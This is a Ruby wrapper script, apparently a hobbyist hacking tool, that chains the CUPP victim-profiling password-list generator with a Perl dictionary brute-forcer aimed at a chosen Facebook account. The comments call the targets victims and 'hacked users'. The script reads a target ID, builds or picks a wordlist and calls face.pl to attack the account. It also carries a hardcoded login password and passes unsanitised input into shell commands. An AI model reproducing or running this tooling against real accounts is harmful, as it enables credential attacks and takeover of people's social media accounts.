#!/usr/bin/ruby
# 
#
# The_Holder V1.0.1
# The_Cupp 3.1.0-alpha
# The Bruteforce-Facebook
# 
#
# Description:
#  
# CUPP 3.1.0-alpha => Common User Passwords Profiler made in PYTHON programming language to find nsome specific 
#     passwords about the victime depending on descriptions you give to the program in your hand :)
#
# Imad'Ox's Facebook Cracker TooL is a password cracking tool written in perl to perform adictionary-based 
#     attack on a specific Facebook user through HTTPS.
#
# The_Holder V1.0.1 made by The_Black_Cat in Ruby programming language to Hold on all those Two programs
#     to simple the using of them for you also it's come with a password security to be sure that only 
#     you, who you can access to your information and your hacked users :) 
#
####################################################
##  be free to use it as you wish 		   #
##	also I'm not responsible of your problems  #
####################################################
#
# Usage:
# You just answer the qustions and you will be Fine :) 
# login could be either a user's email address or ID 
#
# Module Requirements:
#
# Install module if missing: "For The_Bruteforce-Facebook"
# perl -MCPAN -e 'install Net::SSLeay'
#
#
# --- Face-Bruter Facebook password cracking tool
# --- By Black Cat XIII && Imad'Ox
# --- www.facebook.com/imad.elouajib
# --- www.facebook.com/yousef.mhamdi.007
# --- 
begin
#colors changer 
class String
def black;          "\e[30m#{self}\e[0m" end 
def red;            "\e[31m#{self}\e[0m" end
def green;          "\e[32m#{self}\e[0m" end
def brown;          "\e[33m#{self}\e[0m" end
def blue;           "\e[34m#{self}\e[0m" end
def magenta;        "\e[35m#{self}\e[0m" end
def cyan;           "\e[36m#{self}\e[0m" end
def gray;           "\e[37m#{self}\e[0m" end

def bg_black;       "\e[30m#{self}\e[0m" end
def bg_red;         "\e[41m#{self}\e[0m" end
def bg_green;       "\e[42m#{self}\e[0m" end
def bg_brown;       "\e[43m#{self}\e[0m" end
def bg_blue;        "\e[44m#{self}\e[0m" end
def bg_magenta;     "\e[45m#{self}\e[0m" end
def bg_cyan;        "\e[46m#{self}\e[0m" end
def bg_gray;        "\e[47m#{self}\e[0m" end

def bold;           "\e[1m#{self}\e[22m" end
def italic;         "\e[3m#{self}\e[23m" end
def underline;      "\e[4m#{self}\e[24m" end
def blink;          "\e[5m#{self}\e[25m" end
def reverse_color;  "\e[7m#{self}\e[27m" end
end

#Error loader
begin
  require 'io/console'
rescue LoadError
end

##Passwd Hider
if STDIN.respond_to?(:noecho)
  def get_password(prompt="Password: ")
    print prompt
    STDIN.noecho(&:gets).chomp
  end
else
  def get_password(prompt="Password: ")
    `read -s -p "#{prompt}" password; echo $password`.chomp
  end
end

#var to change colors and bgs
a = "+-------------------+".bg_blue.bold.italic
b = "|  THE C.FB  HOLDER |".bg_blue.bold.italic
c = "+-------------------+".bg_blue.bold.italic
d = "+--------------------------------------+".bg_blue.bold.italic
e = "| ".bg_green
f = "|           ".bg_green
name = " Youssef MHAMDI ".bg_red.bold
cod = "|          Coded By : ".bg_green

#Graphizme
print "          "+"/------------------------------------------/""\n".bg_green
print "          "+"#{f}"+"#{a}"+"          |""\n".bg_green
print "          "+"#{f}"+"#{b}"+"          |""\n".bg_green
print "          "+"#{f}"+"#{c}"+"          |""\n".bg_green
print "          "+"#{e}"+"#{d}"+" |""\n".bg_green
print "          "+"|           Welcome Login System           |""\n".bg_green 
print "          "+"|   ------------------------------------   |""\n".bg_green 
print "          "+"|       Please Enter Your Information      |""\n".bg_green 
print "          "+"|      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^     |""\n".bg_green 
print "          "+"#{cod}"+"#{name}"+"     |""\n".bg_green 
print "          "+"|        ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨     |""\n".bg_green 
print "          "+"|    www.facebook.com/yousef.mhamdi.007    |""\n".bg_green.bold 
print "          "+"|   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   |""\n".bg_green 
print "          "+"/------------------------------------------/""\n".bg_green

puts "\n\n"
version = "'The_Holder V1.0.1'".bg_brown
print "       The Version of the Program is #{version}\n\n"


# Informations
print "    Your Idendity Please : "
id = gets.chomp
ids = id.bg_green
@password = get_password("    Enter Your Password Here: ")
puts "\n"
#Clear
system("clear")

wm = "|       Welcome Mr ".bg_blue
esp = "     |".bg_blue
w = "    ".bg_cyan
co = "|         (__)".bg_blue

if  @password == "pass123" && id == "Black cat"
print      "          "+"__________________________________".bg_blue
print "\n""          "+"#{wm}"+"#{ids}"+"#{esp}".bg_blue
print "\n""          "+"|               /                |".bg_blue
print "\n""          "+"|         ,__, /                 |".bg_blue
print "\n""          "+"|         (ôô)____ _             |".bg_blue
print "\n""          "+"#{co}"+"#{w}"+") |            |".bg_blue
print "\n""          "+"|            ||--|| *            |".bg_blue
print "\n""          "+"|________________________________|".bg_blue

else
        print "\n"+"              "+"  ¡ Access Denied Mr #{ids} ! \n".bg_red.bold
	system(exit)

end
         

puts "\n\n"
#target = "100012276721038"
puts "\n"

begin
## Target #######################################
print "   Your Target please:  "
target = gets.chomp

if target == ""
	print " => Please Enter the --TARGET-- next Time \n"
	systeme(exit)
end
#################################################

print "   Do You Have a Password List ?![Y/N]  :  "
passwdList = gets.chomp
print "   Would You Like To Make One ?! [Y/N]  :  "
mklst = gets.chomp

#Clear
system("clear")

#"Dir.chdir" to Change Directory + Conditions
Dir.chdir '/root/Bureau/Pentesting/cupp-master/'
if passwdList == 'N' && mklst == 'Y'
        system("python cupp.py -i")
	print "\n"
	system("ls")
	print "\n"
	print "   Your Password List: "
        passlist = gets.chomp
        system("perl face.pl #{target} #{passlist} ")
	
elsif passwdList == 'N' && mklst == 'N'
	system(exit)

elsif passwdList == 'Y' && mklst == 'Y'
	system("python cupp.py -i")
	print "\n"
	system("ls")
	print "\n"
	print "   Your Password List: "
        passlist = gets.chomp
        system("perl face.pl #{target} #{passlist} ")
elsif passwdList == 'Y' && mklst == 'N'
	print "\n"
	system("ls")
	puts "\n"
	print "   Your Password List: "
	passlist = gets.chomp
	system("perl face.pl #{target} #{passlist} ")
end
end

begin
ct = "Black_Cat"
rb = "The_Holder"
cp = "Muris Kurgas"
py = "Cupp"
bt = "Imad'Ox"
pl = "Face-Bruter"
by = "~~~~~~~~~~~".bg_brown
ye = "| bye bye |".bg_brown
rd = ",__,".red.bg_blue
bl = " /                        |".bg_blue 
br = "|  ".bg_blue
bc = "|                  ".bg_blue

print     "          "+" ________________________________________________ ".bg_blue
print "\n""          "+"|            +================================+  |".bg_blue
print "\n""          "+"|            | Mr #{ct} => #{rb}     |  |".bg_blue
print "\n""          "+"|            | Mr #{cp} => #{py}        |  |".bg_blue
print "\n""          "+"|            | Mr #{bt} => #{pl}      |  |".bg_blue
print "\n""          "+"|            |________________________________|  |".bg_blue
print "\n""          "+"|                        /                       |".bg_blue
print "\n""          "+"#{bc}"+"#{rd}"+"#{bl}".bg_blue
print "\n""          "+"#{br}"+"#{by}"+"     (ôô)____ _                    |".bg_blue
print "\n""          "+"#{br}"+"#{ye}"+"     (__)    ) |                   |".bg_blue
print "\n""          "+"#{br}"+"#{by}"+"        ||--|| *                   |".bg_blue
print "\n""          "+"|________________________________________________|".bg_blue
print "\n""          "+"                                                  ".bg_blue
print "\n\n"

end

end
